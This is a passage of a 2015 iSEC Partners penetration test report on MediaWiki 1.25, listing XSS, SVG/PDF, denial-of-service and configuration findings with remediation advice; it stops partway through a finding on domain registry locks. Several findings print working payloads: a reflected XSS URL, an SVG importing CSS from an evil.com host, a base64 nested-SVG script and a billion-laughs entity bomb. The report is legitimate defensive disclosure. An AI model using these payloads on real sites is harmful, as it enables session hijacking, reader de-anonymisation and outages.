wikimedia foundation mediawiki application penetration test prepared for: prepared by: valentin leon - security engineer david thiel - security engineer justin engler - security engineerisec partners final report - wikimedia foundation mediawiki page 2 of 34 (C)2014, isec partners, inc. prepared by isec partners, inc. for wikimedia foundation. portions of this document and the templates used in its production are the property of isec partners, inc. and can not be copied without permission. while precautions have been taken in the preparation of this document, isec partners, inc, the publisher, and the author(s) assume no responsibility for errors, omissions, or for damages resulting from the use of the information contained herein. use of isec partners services does not guarantee the security of a system, or that computer intrusions will not occur. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 3 of 34 document change log version date change 0.1 2014-12-26 status week 1. 1.0 2015-01-02 release for wikimedia foundation. 1.1 2015-02-13 public release. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 4 of 34 table of contents 1 executive summary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5 1.1 isec risk summary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6 1.2 project summary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7 1.3 findings summary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8 1.4 recommendations summary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9 2 engagement structure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11 2.1 internal and external teams . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11 2.2 project goals and scope . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12 3 detailed findings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14 3.1 classifications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14 3.2 vulnerabilities . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16 3.3 detailed vulnerability list . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17 appendices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31 a web application testing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31 a.1 ssl/tls configuration testing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31 february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 5 of 34 1 executive summary application summary application name mediawiki application version 1.25 application type web application platform php / apache / mysql engagement summary dates december 22, 2014 - january 2, 2015 consultants engaged three total engagement effort six person weeks engagement type application penetration test testing methodology white box vulnerability summary total high severity issues 2 total medium severity issues 8 total low severity issues 2 total informational severity issues 2 total vulnerabilities identified: 14 see section 3.1 on page 14 for descriptions of these classifications. category breakdown: access controls 0 auditing and logging 0 authentication 0 configuration 3 ### cryptography 0 data exposure 2 ## data validation 7 ####### denial of service 2 ## error reporting 0 patching 0 session management 0 timing 0 february 13, 2015 wikimedia foundation version 1.1high attack sophistication business risk low simple difficult (C)2008 isec partners, inc. * reflected xss in api.php * external reference in svg * denial of service attack in svg and xmp metadata * lack of upper limit on password length allows dos * stored xss in svg * custom javascript may yield privilege escalation * weak password policy * lack of registry lock on domain names * users can inspect each other's personal javascript * check user page lacks cross site request forgery (csrf) protection * external reference and xss in pdf isec partners final report - wikimedia foundation mediawiki page 6 of 34 1.1 isec risk summary the isec partners risk summary chart evaluates vulnerabilities according to business risk. the impact of the vulnerability increases towards the bottom of the chart. the sophistication required for an attacker to find and exploit the flaw decreases towards the left of the chart. the closer a vulnerability is to the chart origin, the greater the business risk. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 7 of 34 1.2 project summary the open technology fund (otf) engaged isec partners to perform a source-code assisted security review of wikimedia foundation mediawiki. testing included a web application assessment and an external network audit. three security consultants performed this review during the weeks of december 22 nd and december 29 th for a total of six person-weeks of effort. this security analysis was structured as ``best effort'' within the given time frame. the primary goal of this engagement was to identify vulnerabilities and gaps in the application stack and code base, specifically focusing on new extensions for the 1.25 release. 1 a secondary objective was to run an external network scan on the wikimedia foundation's public range of ips. isec worked closely with the wikimedia foundation (wmf) to perform this test after being introduced by otf. the wmf helped to make this engagement a success by providing isec security engineers with all necessary items at the very beginning of the engagement: a testing environment, source code, and developer documentation. the ip ranges were provided on the second day of the engagement. mediawiki is a mature application that evolved through a long history of patches and code rewrites. 2 many contributors helped on the design and implementation of mediawiki's security . this implies that most of the front-facing attack surfaces have already been reviewed for security flaws, but this also results in a disparate code base, due to the number of code contributors. several elements of mediawiki were considered out-of-scope for this engagement: * data exposure of the usernames. * data exposure of the page content. * network based denial of service (dos). in terms of coverage, the web application testing was predominately focused on traditional web vul- nerabilities such as cross-site request forgery (csrf), cross-site scripting (xss), and other types of injections. isec security engineers focused their testing on the eight areas of concerns prioritized by the wmf detailed in section 2.2 on page 12 . isec leveraged fuzzing techniques in the review of the wikitext parser. fuzzing of the parser did not identify vulnerabilities during the limited duration of the engagement. some dangerous php functions were also identified in the parser section but none of them appear to be exploitable. a substantial amount of time was spent reviewing the upload, processing and display of images and files. isec used several attack techniques, such as injection and compression, and manually reviewed the source code. the checkuser extension was reviewed and fonud vulnerable to csrf. however, isec was unable to identify any areas of concern around the visual editor; the request forwarder code was properly implemented and injection attempts into the html were all prevented when converting the code into wikitext. parallel to the manual testing of the web application, isec performed a network assessment of the public ip range of the wmf. the full ipv4 range was scanned for vulnerabilities; because of the size of the ipv6 range provided, only a fraction of it was scanned. additionally, the dns configuration was reviewed for vulnerabilities. isec also performed an in-depth review of the remaining extensions (namely, centralauth, flow, echo and mediaviewer) but no vulnerabilities related to these components were found. 1https://www.mediawiki.org/wiki/user:csteipp_(wmf)/isec_audit 2http://www.aosabook.org/en/mediawiki.html february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 8 of 34 1.3 findings summary isec identified a total of fourteen issues, including two of high severity . most of the high and medium severity vulnerabilities are related to data validation and allow for various common attacks including xss, dos, and csrf. one out of the two high severity vulnerabilities and two medium severity vulnerabilities allow code execution in another user's session. first, a reflected xss ( finding 1 on page 17 ) exists in the api when a deprecated output format is requested. this vulnerability was found to work on several browsers and bypasses google chrome's anti-xss filters. second, isec bypassed the svg file validation filters and successfully uploaded an svg file that triggers a stored xss ( finding 3 on page 19 ). third, the custom javascript functionality that allows mediawiki users to tailor the application to their needs and preferences may be exploited in a social engineering attack to execute arbitrary code within an administrator's session (finding 8 on page 24 ). the other high severity vulnerability ( finding 2 on page 18 is related to bypassing the svg validation filters. isec uploaded an svg file that includes external resources from a private domain, allowing for attackers to de-anonymize users rendering the document in their browser. isec estimates that it is likely that other attacks are possible on such images, due to their complexity . isec also identified two vulnerabilities that allow for dos attacks. one instance of them (in finding 4 on page 20 ) results from the file upload functionality being vulnerable to entity expansion attacks. the second avenue for dos is due to mediawiki lacking an upper limit on password length ( finding 5 on page 21 ), which may allow an attacker to exhaust server resources by choosing an extremely long password (e.g. 4mb in size). lastly, isec also discovered a number of lower-impact vulnerabilities, including a csrf-vulnerable endpoint (finding 12 on page 28 ), weak password policy ( finding 9 on page 25 ), and a dns configura- tion issue ( finding 10 on page 26 ). february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 9 of 34 1.4 recommendations summary short term short term recommendations are meant to be relatively easy actions to execute, such as configuration changes or file deletions that resolve security vulnerabilities. these may also include more difficult actions that should be taken immediately to resolve high-risk vulnerabilities. this area is a summary of short term recommendations; additional recommendations can be found in the vulnerabilities section. strengthen xss protection mechanisms. modify input validation filters to account for all edge cases. ensure user input is validated against a case-insensitive filter. additionally, apply proper output encoding to all user driven input that is displayed back to the user. implement a data limit on user supplied input.ensure all user input is limited to context-appropriate maximum size limits. this is especially important in cases where a cryptographic function will be applied to that data. provide a click-through warning for potentially dangerous attachments. some file formats are inherently dangerous for anonymity due to their complexity and large feature-set. consider adding a click-through warning to make users aware that attachments may compromise their anonymity when viewed directly . create a strong password policy . create and enforce a password policy which requires complex passwords when registering for accounts. additionally disallow the use of simple passwords by imple- menting a blacklist of common passwords that cannot be used. update server with proper ssl/tls ciphers. remove insecure ssl/tls ciphers from all production environments. ensure that the server only allows cryptographically strong cipher suites. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 10 of 34 long term long term recommendations are more complex and systematic changes that should be taken to secure the system. these may include significant changes to the architecture or code and may therefore require in-depth planning, complex testing, significant development time, or changes to the user experience that require retraining. implement a content security policy (csp). csp controls what types of active content (such as javascript or applets) and passive content (such as fonts, css or images) the browser will allow, based on the how the content is presented and where it is loaded from. a well-configured csp helps provides additional protection against many xss attacks. isec also recommends mediawiki to leverage csp in order to limit passive content like images. this can be configured to prohibit callbacks to third parties on page loads, effectively preventing de-anonymization. review and implement svg best practices. svg images can accomplish actions similar to html, the attack surface is very similar: xml attacks, dom attacks, xss. because mediawiki is vulnerable to many of these attacks, isec recommends wikimedia foundation to spend some time reviewing the svg best practices and implementing appropriate security measures. isec published some research 3 and a test suite 4 to help with svg testing. eliminate custom css/javascript. isec found multiple issues with the custom javascript system. this system appears to pose significant risk for relatively small benefit. as such, isec recommends that wikimedia foundation deprecate this functionality and allow users instead to customize their experience on the client side using browser extensions such as greasemonkey or tampermonkey . authenticate using multiple factors. combine two of more forms of authentication to verify a user. all users with administrator privileges should be required to authenticate this way . all other users should have the option to opt-in. review all server requests for csrf protection. all site wide, state-changing requests should require a unique, unpredictable token. additionally, do not allow an extension to make any changes to the wiki without including this token in the request. ensure ssl/tls configurations meet industry best practices. regularly review the ssl/tls con- figuration for all servers. keep up-to-date with the latest ssl/tls attacks and weaknesses such that if they are encountered on any wikimedia foundation server, they are mitigated immediately . 3http://ciphertext.info/papers/svg_security-openforum.pdf 4https://github.com/rdegraaf/svg_security_test_suite february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 11 of 34 2 engagement structure 2.1 internal and external teams the isec team has the following primary members: * valentin leon - security engineer valentin@isecpartners.com * david thiel - security engineer david@isecpartners.com * justin engler - security engineer justin@isecpartners.com * michael reisinger - project manager mreisinger@isecpartners.com * tom ritter - account manager tritter@isecpartners.com the wikimedia foundation team has the following primary members: * chris steipp - wikimedia foundation csteipp@wikimedia.org isec would like to thank the following security engineers for their help: * adam cotenoff * damon smith * daniel crowley * divya natesan * greg foringer * pratik guha sarkar february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 12 of 34 2.2 project goals and scope the goal of this engagement was to determine what actions a malicious user of mediawiki would be able to perform that could lead to the compromise of user sessions or bypass of security restrictions. priority list: on top of a regular web application security review, isec focused on the following list of components, prioritized by wikimedia foundation. 5 * the wikitext to html parser. * the upload, processing and display of images and files. * the visualeditor extension. * the centralauth extension. * the checkuser extension. * the mediaviewer extension. * the echo extension. * the flow extension. * an ipv4 and ipv6 scan of the public network ranges of the wikimedia foundation. web application security testing: isec performed a targeted web application review . * application abuse/logic testing: public, internal tools, and manual techniques were used to determine whether attackers can: - obtain access to private data belonging to other users or subscribers. - make unauthorized changes to system or customer data. - bypass business logic rules around account changes. - bypass authentication and authorization mechanisms. - elevate privileges to site administrator or other higher-privileged users. - hijack accounts belonging to other users. - abuse password recovery methods. * standard web application security testing: the security testing evaluated the application for standard and advanced application web security issues, including: - cross-site scripting (xss). - cross-site request forgery (csrf). - command injection (sql, ldap , and os command injection). - server-side includes (ssi) injection. - common weaknesses in session management (authentication and authorization) includ- ing: * improper token invalidation. * predictable session tokens. 5https://www.mediawiki.org/wiki/user:csteipp_(wmf)/isec_audit february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 13 of 34 * insufficient protection against session fixation. - cookie injection attacks. - xml injection attacks. - attacks against the http application server, including: * insecure configuration. * processing of unsafe http verbs. * response splitting. * directory traversal. * forced browsing. - information leaks. - transport layer security weaknesses, including: * weak cipher suite configuration. * insufficient protection of sensitive information in transit. * source code security review: isec reviewed the source code to analyze the application's security protections and focused on proper implementation of: - cross-site request forgery (csrf) protection mechanisms. - data validation mechanisms. - output encoding mechanisms. - database calls and queries (usage and implementation). - session creation (session generation and session token randomness). - authentication and access control mechanisms and frameworks. - cryptographic protections. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 14 of 34 3 detailed findings 3.1 classifications the following section describes the classes, severities, and exploitation difficulty rating assigned to each issue that isec identified. vulnerability classes class description access controls related to authorization of users, and assessment of rights auditing and logging related to auditing of actions, or logging of problems authentication related to the identification of users configuration related to security configurations of servers, devices, or software cryptography related to mathematical protections for data data exposure related to unintended exposure of sensitive information data validation related to improper reliance on the structure or values of data denial of service related to causing system failure error reporting related to the reporting of error conditions in a secure fashion patching related to keeping software up to date session management related to the identification of authenticated users timing related to the race conditions, locking, or order of operations severity categories severity description informational the issue does not pose an immediate risk, but is relevant to secu- rity best practices or defense in depth undetermined the extent of the risk was not determined during this engagement low the risk is relatively small, or is not a risk the customer has indicated is important medium individual user's information is at risk, exploitation would be bad for client's reputation, of moderate financial impact, possible legal implications for client high large numbers of users, very bad for client's reputation or serious legal implications. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 15 of 34 difficulty levels difficulty description undetermined the difficulty of exploit was not determined during this engagement low commonly exploited, public tools exist or can be scripted that ex- ploit this flaw medium attackers must write an exploit, or need an in depth knowledge of a complex system high the attacker must have privileged insider access to the system, may need to know extremely complex technical details or must discover other weaknesses in order to exploit this issue february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 16 of 34 3.2 vulnerabilities the following table is a summary of vulnerabilities identified by isec. subsequent pages of this report detail each of the vulnerabilities, along with short and long term remediation advice. vulnerability class severity 1. reflected xss in api.php data validation high 2. external reference in svg data validation high 3. stored xss in uploaded svg files data validation medium 4. entity expansion in svg and xmp metadata denial of service medium 5. lack of upper limit on password length allows dos denial of service medium 6. external reference in pdf data validation medium 7. stored xss in pdf files data validation medium 8. custom javascript may yield privilege escalation data validation medium 9. weak password policy configuration medium 10. lack of registry lock on domain names configuration medium 11. users can inspect each other's personal javascript data exposure low 12. check user page lacks cross site request forgery (csrf) protection data validation low 13. user access roles are public data exposure informational 14. rc4 cipher enabled configuration informational february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 17 of 34 3.3 detailed vulnerability list 1. reflected xss in api.php class: data validation severity: high difficulty: low finding id: isec-wmf1214-8 targets: the api endpoint, available at http://devwiki/w/api.php. description: the api supports multiple data output formats, some of which have recently been deprecated. the wddx output format will return a response with content-type: text/xml . the response always indicates that the wddx output format has been deprecated and instructs the api user to use the json format instead. however, if an api request with this output format is sent to api.php with an invalid parameter, the response will also include an error message that reflects the user-supplied parameter without any output encoding. this allows an attacker to inject xml, which can be used to trick the browser into interpreting the response as xhtml and executing injected javascript. to exploit this vulnerability, an attacker can craft a simple url that, when clicked by a mediawiki user, will execute arbitrary javascript in their browser session for that domain. the following url will execute javascript that pops up an alert window on the resulting mediawiki page, demonstrating a reflected xss attack. http://devwiki/w/api.php?action=flow&format=wddx&submodule=invalid%3c/string%3e%3cfoo%3e%0a%3ch tml%20xmlns%3ahtml%3d%27http%3a%2f%2fwww.w3.org%2f1999%2fxhtml%27%3e%0a%20%3chtml%3ascript%3ea lert(%22reflected%20xss!%22)%3b%3c%2fhtml%3ascript%3e%0a%3c%2fhtml%3e%0a%3c%2ffoo%3e%3cstring%3 e&page=user_talk%3aadmin&ntreplyto=&nttopic=flow&ntcontent=flowwwww&token=3b44a9711080c52414b4 d1f05682590554a1ead0%2b this exploit works on several browsers that isec tested and bypasses chrome's anti-xss filters, making it especially effective. exploit scenario: an attacker crafts a malicious link with javascript that attempts to assign admin- istrative rights to their own user account. they insert the link on a mediawiki page and wait for an active administrator with the appropriate privileges to click it. when the administrator clicks the link, the javascript is reflected in the response, which results in the administrator's browser silently sending a request to grant administrator privilege to the attacker's mediawiki account. the attacker then uses this unauthorized privileged access to inspect user ip addresses or destroy content. short term solution: in this case, because the wddx format is deprecated, no user-supplied data needs to be reflected in the response at all. if there is a specific need to display this error data, including the user-supplied parameters, apply the same output encoding that is used when thexml output format is requested. review the code for similar issues where output-encoding has not been applied to a response. long term solution: implement security regression tests that ensure that appropriate output en- coding occurs for all user-supplied data. implement a content security policy (csp). csp is an http header that can control what types of active content (such as javascript, applets, and css) the browser will allow, based on how the content is presented. an optimally configured csp policy will never allow browsers to execute inline javascript, eval statements, or scripts in dom event attributes. this requires that all javascript is loaded explicitly from external sources with whitelisted urls. however, if inline scripts and event attributes are required in the meantime, the csp header can by used to transmit a nonce value with each source in the whitelist. this nonce must then be included as a script attribute and checked by the server. this helps prevent xss attacks. the csp specification can be found at https://w3c.github.io/webappsec/specs/content-security-policy/#usage-4 . february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 18 of 34 2. external reference in svg class: data validation severity: high difficulty: low finding id: isec-wmf1214-3 targets: the upload feature, available at http://devwiki/wiki/special:upload. description: when uploading an svg file, it is possible to bypass the validation filters and upload an svg file that references a remote css file. the validation routines that prevent inclusion of remote css files perform checks in a case-sensitive manner and fails to blockimport and other case-variations. for example, the following style declaration within an svg file will cause any browser that renders the file to fetch http://evil.com/attack.css: <svg xmlns= "http: // www .w3.org /2000/ svg "> <style> @import 'http: // evil .com /attack .css ';</style> </svg> listing 1: specially-crafted svg file including a remote style sheet. this vulnerability can be exploited to de-anonymize mediawiki's readers. this can be used by mali- cious individuals or governments who will be able to identify the reader's location from their ip address, as well as the visited page from the referrer header. exploit scenario: a mediawiki user uploads a hostile svg file that references a style sheet on an attacker-controlled webserver. the user then embeds this svg file into the content of an article. by monitoring users that request the style sheet, the attacker can build a complete list of users that have viewed the article in question. short term solution: modify the regular expressions for validating svg file uploads to block the import keyword in a case-insensitive manner. long term solution: examine all other validation expressions to ensure that case sensitivity is han- dled in a context-appropriate manner. implement a csp in order to limit passive content like images. this can be configured to prohibit callbacks to third parties on page loads, effectively preventing de- anonymization. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 19 of 34 3. stored xss in uploaded svg files class: data validation severity: medium difficulty: low finding id: isec-wmf1214-11 targets: the upload feature, available at http://devwiki/wiki/special:upload. description: when uploading an svg file, it is possible to bypass the validation filters and upload an svg file that executes javascript when rendered. the svg validation is a blacklist-based approach and contains protections against numerous techniques for embedding javascript in svg files; however, the protections against nested svg files are inadequate due to a missing mime type blacklist. specifically, data: uris with the image/svg or text/xml formats are blacklisted, but the application/xml mime type is sufficient to create a nested svg file with javascript code. # /includes /upload /uploadbase .php # href with embedded svg as target if ($stripped == 'href ' && preg_match ( '!data :[^,]* image /svg [^,]*,! sim ', $value )){ wfdebug ( __method__ . ": found href to embedded svg " . "\"< $strippedelement '$attrib '=' $value '...\" in uploaded file .\n" ); return true ;} # href with embedded (text /xml ) svg as target if ( $stripped == 'href ' && preg_match ( '!data :[^,]* text /xml [^,]*,! sim ', $value )){ wfdebug ( __method__ . ": found href to embedded svg " . "\"< $strippedelement '$attrib '=' $value '...\" in uploaded file .\n" ); return true ;} listing 2: blacklist filtering for data: uris with specific mime types. the following example svg file contains a nested svg file embedded within a data: uri. the nested svg file contains executable javascript. <svg xmlns= "http: // www .w3.org /2000/ svg " xmlns:xlink= "http: // www .w3.org /1999/ xlink "> <use xlink:href= "data:application /xml ;base64 , phn2zyb4bwxucz0iahr0cdovl3d3dy53my5vcmcvmjawmc9zdmciihhtbg5zonhsaw5r psjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hsaw5rij4kpgrlznm +cjxjaxjjbgugawq9inrlc3qiihi9i juwiibjed0imtawiibjet0imtawiibzdhlszt0izmlsbdogi0ywmci +cjxzzxqgyxr0cmlidxrltm ftzt0izmlsbcigyxr0cmlidxrlvhlwzt0iq1ntiibvbmjlz2lupsdhbgvydchkb2n1bwvudc5jb29r awupjwpvbmvuzd0nywxlcnqoim9uzw5kiiknihrvpsijmdbgiibizwdpbj0imxmiigr1cj0inxmiic 8+ cjwvy2lyy2xlpgo8l2rlznm +cjx1c2ugegxpbms6ahjlzj0ii3rlc3qilz4kpc9zdmc +# test "/> </svg> listing 3: svg file with a nested svg file containing executable javascript code. during testing, this exploit was only confirmed against the firefox browser. testing indicates that other browsers do not support nested svg files. javascript in svg files is evaluated in its own sandbox origin; it should not have access to cookies or other data from the wiki domain context. exploit scenario: an attacker crafts a malicious svg document that contains canned javascript exploit code and uploads it to a popular section on the mediawiki application. when the svg file is viewed, the victim's browser is fingerprinted and instructed to download appropriate exploit code from an attacker-controlled server. the attacker is able to compromise users who view the hostile svg file, and the attacker can expand their impact by hijacking the privileges of the victim users. short term solution: modify the svg validation blacklist filters to include the application/xml mime type. verify that no other mime types can be used to embed nested svg files. long term solution: transition the svg validation logic to a whitelist-based approach. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 20 of 34 4. entity expansion in svg and xmp metadata class: denial of service severity: medium difficulty: low finding id: isec-wmf1214-13 targets: the xml parser of the upload feature, available at http://devwiki/wiki/special:upload. description: when uploading an svg file, or any file that includes xmp metadata, it is possible to include xml doctype declarations that trigger an xml entity expansion attack against the xml parser when the uploaded file is processed. this attack uses a series of expanding xml entities that, when fully expanded, can consume a large amount of memory . this causes the xml parser to consume all available resources on the system, leaving the webserver unresponsive. the billion laughs 6 attack is an example of such attack, which results in approximately 3gb of data to be processed. an example of a file that exploits this vulnerability is below: <? xml version ="1.0 " encoding= "utf -8" standalone ="yes "?> <! doctype svg [ <!entity lol "lol "> <! element lolz (# pcdata )> <! entity lol1 "&lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;& lol ;"> <! entity lol2 "&lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;& lol1 ;"> <! entity lol3 "&lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;& lol2 ;"> <! entity lol4 "&lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;& lol3 ;"> <! entity lol5 "&lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;& lol4 ;"> <! entity lol6 "&lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;& lol5 ;"> <! entity lol7 "&lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;& lol6 ;"> <! entity lol8 "&lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;& lol7 ;"> <! entity lol9 "&lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;& lol8 ;"> ]> <svg> <lolz>& lol9 ;</lolz> </svg> listing 4: example of the billion laughs attack embedded in an svg file. this file will cause consumption of 3gb of memory when uploaded. exploit scenario: a mediawiki user wishes to suppress information contained on wikimedia foun- dation's website during a sensitive election period. to accomplish this, the attacker uploads a hostile svg file containing the billion laughs attack. the attacker is able to bring the mediawiki application offline for an extended period during a critical timeframe. short term solution: determine if xml dtd support is necessary for the correct processing of uploaded files. disable dtd parsing if it is unnecessary . long term solution: set limits on execution time and resource usage for all scripts that perform entity substitution on xml data. 6https://en.wikipedia.org/wiki/billion_laughs february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 21 of 34 5. lack of upper limit on password length allows dos class: denial of service severity: medium difficulty: low finding id: isec-wmf1214-1 targets: the login page, available at http://devwiki/w/index.php?title=special:userlogin. description: the application does not have an upper limit on the length of a user-supplied password, which allows for arbitrarily large strings to be passed to the password hashing function. because pass- words are hashed by default using pbkdf2+sha256 with a cost of 10,000, extremely large passwords can be used to consume large amounts of system resources, resulting in the site becoming unresponsive to other requests. exploit scenario: an unauthenticated attacker writes a script that attempts to log into a user ac- count with a very large password,e.g. 2-4mb in size. running this script repeatedly against wikimedia foundation endpoints could cause enough servers to consume their resources, causing the site to become unresponsive or inaccessible to legitimate users. short term solution: implement an upper limit for password strings-128 characters should be more than sufficient. enforce this limit before performing any further processing on user-supplied passwords. long term solution: before performing any compression, decompression or hashing operation, ensure that user-supplied data meets basic sanity parameters in terms of size and length. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 22 of 34 6. external reference in pdf class: data validation severity: medium difficulty: medium finding id: isec-wmf1214-15 targets: the upload feature, available at http://devwiki/wiki/special:upload. description: pdf files can contain references to external content, such as images, audio, and video. loading external content from a pdf can be used to de-anonymize users who view the pdf directly using adobe reader or another pdf reader. exploit scenario: an attacker wishes to determine who reads a specific wiki article. the attacker creates a pdf that loads content from an attacker-controlled server, using an existing pdf document related to the article as a base. a user interested in the topic opens the pdf for more information while reading the article and their pdf reader sends a request to the attacker's server, revealing their ip address, and by extension, their location. short term solution: provide a click-through warning informing users that pdf documents are active content that could potentially de-anonymize them when viewed directly . long term solution: convert uploaded pdfs to static images to avoid issues with active content. ensure the library used for conversion is robust as it will be parsing potentially malicious content on the server side, which could be a greater compromise than individual users. consider setting up a sandboxed environment. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 23 of 34 7. stored xss in pdf files class: data validation severity: medium difficulty: medium finding id: isec-wmf1214-14 targets: the upload feature, available at http://devwiki/wiki/special:upload. description: the pdf format allows for documents containing embedded javascript. during testing, a pdf that executes javascript when the document is opened was successfully uploaded. testing indicated that this feature only works in adobe reader, whereas other readers such as the pdf reader built into firefox and the pdf reader built into chrome do not support javascript actions. javascript could be used to de-anonymize a user or to attempt exploits against a user. pdf readers execute embedded javascript in a sandboxed context that should not have any ability to access data from the wiki domain. exploit scenario: an attacker wishes to determine who reads a specific wiki article. the attacker creates a pdf that uses javascript to make surreptitious http requests to an attacker-controlled server, using an existing pdf document related to the article as a base. a user interested in the topic opens the pdf for more information while reading the article and their pdf reader sends a request to the attacker, revealing their ip address, and by extension, their location. short term solution: provide a click-through warning informing users that pdf documents are active content that could potentially de-anonymize them when viewed directly . long term solution: convert uploaded pdfs to static images to avoid issues with active content. ensure the library used for conversion is robust as it will be parsing potentially malicious content on the server side, which could be a greater compromise than individual users. consider setting up a sandboxed environment. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 24 of 34 8. custom javascript may yield privilege escalation class: data validation severity: medium difficulty: medium finding id: isec-wmf1214-10 targets:user's custom scripts, such ashttp://devwiki/w/index.php?title=user:foo/common.js&action= submit. description: when editing any user's custom javascript, the script is executed whenever the ``show preview'' or ``show changes'' buttons are clicked. this could allow an attacker to trick another user into executing javascript which hijacks their session. because privileged users can edit the javascript of lower privileged users, this could lead to privilege escalation. exploit scenario: a low-privileged user adds some complex custom javascript to their account, with malicious code embedded within that directs people to a fake login screen or performs actions on the victim's behalf. the user complains to an administrator that they are having difficulty with their custom ``skin'' , and asks the administrator to change a small portion of the script for them. upon pre- viewing the edit or viewing changes, the malicious code executes in the context of the administrator's session. short term solution: do not include another user's custom script when previewing or showing changes. these pages should only allow users to edit and view code. long term solution:the custom javascript system has two security flaws (seefinding 10 on page 27). consider deprecating this functionality and allowing users to customize the site using client-side code instead. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 25 of 34 9. weak password policy class: configuration severity: medium difficulty: high finding id: isec-wmf1214-2 targets: the signup page, available at http://devwiki/w/index.php?title=special:userlogin&type= signup. description: wikimedia foundation does not enforce a strong password policy for the mediawiki application. upon account creation, a user can enter any password as long as the password is at least 1 character long and different than the user's username. the lack of password complexity requirements often results in a number of users choosing weak passwords, which increases the odds of an attacker to successfully guess user's passwords by performing a brute force or dictionary attack. exploit scenario: an attacker makes a small list of very common passwords that likely to be used on mediawiki, such as ``password'' or ``wiki'' . the attacker enumerates all usernames and tries to login with the weak passwords. because of the large amount of users on mediawiki, and the weak password policy, the success rate of the attack is high, giving the attacker mass acount takeover. short term solution:implement and enforce a policy to require complex passwords. the following is an example of a complex password policy . passwords should: * be a minimum of eight characters long * contain at least one of each of the following: - an uppercase letter - a lowercase letter - a number - a special character * be different than a user's username * implement a blacklist of passwords that the user cannot use. (e.g., 123456, password, pass- word123, qwerty1!, etc.) long term solution: in addition to enforcing the use of strong passwords, wikimedia foundation should require all admins to authenticate using multi-factor authentication, with the option for non- privileged users to opt-in. february 13, 2015 wikimedia foundation version 1.1isec partners final report - wikimedia foundation mediawiki page 26 of 34 10. lack of registry lock on domain names class: configuration severity: medium difficulty: high finding id: isec-wmf1214-5 targets: the dns configuration of wikimedia.org, wikipedia.org and mediawiki.org. description: there is no dns registry lock on the various domains of the wikimedia foundation. isec performed dns whois queries on the target domains and observed that while flags are in place to prevent client transfers, no registry locks are set up to prohibit server transfers. this could allow for a malicious or compromised registrar 7 to transfer the domain to malicious 